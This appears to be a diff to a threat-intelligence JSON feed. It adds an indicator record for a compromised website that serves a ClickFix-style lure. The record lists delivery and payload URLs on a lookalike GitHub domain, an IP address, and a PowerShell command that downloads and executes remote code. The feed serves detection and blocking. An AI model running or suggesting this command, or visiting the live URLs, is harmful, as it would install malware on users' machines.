@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "nmengineering.co.za",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/click/41422c4edd1735b5"
+    ],
+    "IP": [
+      "102.130.117.48"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/click/41422c4edd1735b5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/click/41422c4edd1735b5"
+    ],
+    "ReportId": "cmwfqf7a40ivv0oml8u89k1od",
+    "ScannedAt": "2026-11-14T01:33:36.554000+00:00"
+  },
+  {
     "UrlDomain": "www.mediweld.com",
     "DeliveryUrl": [
       "browse-cloud.codes"
